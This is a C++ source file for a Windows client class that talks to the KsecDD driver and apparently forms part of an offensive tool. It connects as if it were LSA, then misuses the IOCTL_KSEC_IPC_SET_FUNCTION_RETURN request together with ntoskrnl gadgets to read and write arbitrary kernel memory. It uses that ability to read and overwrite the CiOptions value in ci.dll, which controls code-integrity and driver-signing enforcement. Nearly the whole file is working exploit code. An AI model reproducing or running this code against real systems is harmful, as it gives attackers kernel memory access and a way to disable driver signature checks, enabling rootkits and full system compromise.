#include "KsecDD.h"
#include "nt.h"
#include "common.h"

KsecDD::KsecDD()
{
    BYTE readGadgetPattern[] = PATTERN_READ_MEMORY;
    BYTE writeGadgetPattern[] = PATTERN_WRITE_MEMORY;

    m_hDevice = NULL;
    m_bIsInitialized = FALSE;
    m_pKernelBaseAddress = 0;
    m_pCiBaseAddress = 0;
    m_dwCiOptionsOffset = 0;
    m_dwReadGadgetOffset = 0;
    m_dwWriteGadgetOffset = 0;
    m_pReadGadgetAddress = 0;
    m_pWriteGadgetAddress = 0;

    if (!Common::FindKernelModuleBaseAddress("ntoskrnl.exe", &m_pKernelBaseAddress)) goto exit;
    if (!Common::FindKernelModuleBaseAddress("ci.dll", &m_pCiBaseAddress)) goto exit;
    if (!Common::FindCiOptionsOffset(&m_dwCiOptionsOffset)) goto exit;
    if (!Common::FindGadgetOffset(L"ntoskrnl.exe", readGadgetPattern, sizeof(readGadgetPattern), &m_dwReadGadgetOffset)) goto exit;
    if (!Common::FindGadgetOffset(L"ntoskrnl.exe", writeGadgetPattern, sizeof(writeGadgetPattern), &m_dwWriteGadgetOffset)) goto exit;

    m_pReadGadgetAddress = m_pKernelBaseAddress + m_dwReadGadgetOffset;
    m_pWriteGadgetAddress = m_pKernelBaseAddress + m_dwWriteGadgetOffset;
    m_bIsInitialized = TRUE;

exit:
    return;
}

KsecDD::~KsecDD()
{
    if (m_hDevice) NtClose(m_hDevice);
}

BOOL KsecDD::IsInitialized() const
{
    return m_bIsInitialized;
}

BOOL KsecDD::IsConnected()
{
    return this->m_hDevice != NULL;
}

BOOL KsecDD::Connect()
{
    BOOL bResult = FALSE;

    if (!this->SetLsaInitializedEvent(KSEC_EVENT_NAME_U)) goto exit;
    if (!this->OpenDevice(DD_KSEC_DEVICE_NAME_U, &this->m_hDevice)) goto exit;
    if (!this->IoctlConnectLsa(NULL)) goto exit;

    bResult = TRUE;

exit:
    return bResult;
}

BOOL KsecDD::Disconnect()
{
    NTSTATUS status;

    if (!this->m_hDevice)
        return TRUE;

    status = NtClose(this->m_hDevice);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtClose", status);
        return FALSE;
    }

    this->m_hDevice = NULL;

    return TRUE;
}

BOOL KsecDD::QueryCiOptionsValue(OUT PDWORD CiOptions)
{
    return this->ReadKernelMemory32(this->m_pCiBaseAddress + this->m_dwCiOptionsOffset, (PUINT32)CiOptions);
}

BOOL KsecDD::SetCiOptionsValue(IN DWORD CiOptions)
{
    return this->WriteKernelMemory32(this->m_pCiBaseAddress + this->m_dwCiOptionsOffset, CiOptions);
}

BOOL KsecDD::CheckIsInitialized()
{
    if (!m_bIsInitialized)
    {
        PRINT_ERROR(L"Client is not initialized.\n");
        return FALSE;
    }

    return TRUE;
}

BOOL KsecDD::SetLsaInitializedEvent(IN LPCWSTR Event)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    HANDLE hEvent = NULL;
    UNICODE_STRING usEventPath = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };

    RtlInitUnicodeString(&usEventPath, Event);
    InitializeObjectAttributes(&oa, &usEventPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenEvent(&hEvent, EVENT_MODIFY_STATE, &oa);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtOpenEvent", status);
        goto exit;
    }

    status = NtSetEvent(hEvent, NULL);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetEvent", status);
        goto exit;
    }

    bResult = TRUE;

exit:
    if (hEvent) NtClose(hEvent);

    return bResult;
}

BOOL KsecDD::OpenDevice(IN LPCWSTR Name, OUT PHANDLE Device)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    UNICODE_STRING usDevicePath = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };
    IO_STATUS_BLOCK iosb = { 0 };
    HANDLE hDevice = NULL;
    FILE_IO_COMPLETION_NOTIFICATION_INFORMATION FileInformation = { 0 };

    *Device = NULL;

    RtlInitUnicodeString(&usDevicePath, Name);
    InitializeObjectAttributes(&oa, &usDevicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hDevice, GENERIC_READ | GENERIC_WRITE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtOpenFile", status);
        goto exit;
    }

    // As implemented in lsass!LsapOpenKsec
    FileInformation.Flags = FILE_SKIP_SET_EVENT_ON_HANDLE | FILE_SKIP_SET_USER_EVENT_ON_FAST_IO;

    status = NtSetInformationFile(hDevice, &iosb, &FileInformation, sizeof(FileInformation), (FILE_INFORMATION_CLASS)FileIoCompletionNotificationInformation);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetInformationFile", status);
        goto exit;
    }

    *Device = hDevice;
    bResult = TRUE;

exit:
    if (!bResult && hDevice) NtClose(hDevice);

    return bResult;
}

BOOL KsecDD::DeviceIoControl(IN HANDLE Device, IN DWORD IoControlCode, IN OPTIONAL LPVOID InBuffer, IN DWORD InBufferSize, OUT OPTIONAL LPVOID OutBuffer, IN DWORD OutBufferSize)
{
    NTSTATUS status;
    IO_STATUS_BLOCK iosb = { 0 };

    status = NtDeviceIoControlFile(Device, NULL, NULL, NULL, &iosb, IoControlCode, InBuffer, InBufferSize, OutBuffer, OutBufferSize);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtDeviceIoControlFile", status);
        return FALSE;
    }

    return TRUE;
}

BOOL KsecDD::IoctlConnectLsa(OUT OPTIONAL PDWORD SystemPid)
{
    DWORD dwLsapSystemProcessId = 0;

    if (!this->DeviceIoControl(this->m_hDevice, IOCTL_KSEC_CONNECT_LSA, NULL, 0, &dwLsapSystemProcessId, sizeof(dwLsapSystemProcessId)))
    {
        return FALSE;
    }

    if (SystemPid) *SystemPid = dwLsapSystemProcessId;

    return TRUE;
}

BOOL KsecDD::IoctlIpcSetFunctionReturn(IN PSET_FUNCTION_RETURN_REQ Request)
{
    if (!this->DeviceIoControl(this->m_hDevice, IOCTL_KSEC_IPC_SET_FUNCTION_RETURN, Request, sizeof(*Request), NULL, 0))
        return FALSE;

    return TRUE;
}

BOOL KsecDD::ReadKernelMemory32(IN ULONG_PTR Address, OUT PUINT32 Value)
{
    UINT64 val = 0;

    if (!this->ReadKernelMemory64(Address, &val))
        return FALSE;

    *Value = val & 0xffffffff;

    return TRUE;
}

BOOL KsecDD::ReadKernelMemory64(IN ULONG_PTR Address, OUT PUINT64 Value)
{
    FUNCTION_RETURN fr = { 0 };
    SET_FUNCTION_RETURN_REQ req = { 0 };

    if (!this->CheckIsInitialized())
        return FALSE;

    fr.Function = (PVOID)this->m_pReadGadgetAddress;
    fr.Argument = (PVOID)(Address - 0x10); // Account for 'RCX+0x10' in the gadget
    req.FunctionReturn = &fr;
    req.Value = 0; // EDX value not used here

    if (!this->IoctlIpcSetFunctionReturn(&req))
        return FALSE;

    *Value = (UINT64)req.FunctionReturn;

    return TRUE;
}

BOOL KsecDD::WriteKernelMemory32(IN ULONG_PTR Address, IN UINT32 Value)
{
    FUNCTION_RETURN fr = { 0 };
    SET_FUNCTION_RETURN_REQ req = { 0 };

    if (!this->CheckIsInitialized())
        return FALSE;

    fr.Function = (PVOID)this->m_pWriteGadgetAddress;
    fr.Argument = (PVOID)Address;
    req.FunctionReturn = &fr;
    req.Value = Value;

    if (!this->IoctlIpcSetFunctionReturn(&req))
        return FALSE;

    return TRUE;
}